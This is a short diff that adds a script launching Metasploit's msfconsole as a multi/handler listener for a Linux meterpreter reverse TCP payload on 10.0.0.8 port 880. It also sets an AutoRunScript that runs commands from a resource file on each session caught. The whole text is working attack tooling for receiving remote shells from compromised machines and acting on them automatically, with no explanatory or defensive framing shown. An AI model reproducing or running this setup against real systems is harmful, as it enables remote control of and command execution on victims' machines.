@@ -1,0 +1,6 @@
+msfconsole -x "use multi/handler;\
+set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+set LHOST 10.0.0.8;\
+set LPORT 880;\
+set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
+exploit"
